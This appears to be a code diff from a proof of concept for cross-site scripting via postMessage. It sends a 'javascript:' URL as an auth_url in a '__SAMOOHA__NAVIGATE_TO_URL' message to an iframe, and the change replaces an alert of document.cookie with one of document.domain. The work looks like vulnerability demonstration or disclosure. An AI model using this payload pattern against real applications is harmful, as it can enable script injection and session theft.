@@ -19,7 +19,7 @@ components.html(
             console.log("Iframe cargado internamente por JS, enviando postMessage...");
             f.contentWindow.postMessage({
               eventKey: "__SAMOOHA__NAVIGATE_TO_URL",
-              data: { auth_url: "javascript:alert(document.cookie);" }
+              data: { auth_url: "javascript:alert(document.domain);" }
             }, "*");
         };
         
